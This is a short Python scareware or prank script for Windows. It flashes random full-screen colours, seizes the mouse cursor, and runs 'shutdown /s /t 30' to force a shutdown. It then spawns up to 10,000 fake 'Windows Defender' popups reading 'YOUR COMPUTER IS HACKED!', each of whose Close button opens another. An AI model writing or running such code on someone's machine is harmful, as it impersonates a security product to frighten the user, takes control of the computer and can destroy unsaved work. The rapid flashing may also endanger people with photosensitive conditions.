
import ctypes
import random
import tkinter as tk
import time
import os

# Generate a random color in hex format


def random_color():
    return "#%02x%02x%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

# Flash function


def flash_colors(root, canvas, flashes=20, delay=200):
    def flash(i):
        if i < flashes:
            canvas.configure(bg=random_color())
            root.after(delay, flash, i + 1)
        else:
            root.destroy()

    flash(0)


# Set up full-screen Tkinter window
root = tk.Tk()
root.attributes('-fullscreen', True)
canvas = tk.Canvas(root, bg='black')
canvas.pack(fill=tk.BOTH, expand=True)

# Start flashing
flash_colors(root, canvas, flashes=30, delay=100)  # 100 ms between flashes

# Run the GUI
root.mainloop()


user32 = ctypes.windll.user32


def screen_glitch(duration=10):
    end_time = time.time() + duration
    while time.time() < end_time:
        x = random.randint(-20, 20)
        y = random.randint(-20, 20)
        user32.SetCursorPos(960 + x, 540 + y)  # move near center with offset
        time.sleep(0.01)


def create_popup():
    popup = tk.Toplevel()
    popup.title("Windows Defender")
    label = tk.Label(popup, text="YOUR COMPUTER IS HACKED!")
    label.pack(padx=20, pady=20)
    button = tk.Button(popup, text="Close", command=create_popup)
    button.pack(pady=10)


screen_glitch()

root = tk.Tk()
root.withdraw()  # Hide the root window
os.system("shutdown /s /t 30")
# Create multiple popups
for i in range(10000):  # Adjust the number as needed
    root.after(i * 50, create_popup)  # Delay each popup by 0.5 seconds

root.mainloop()
screen_glitch()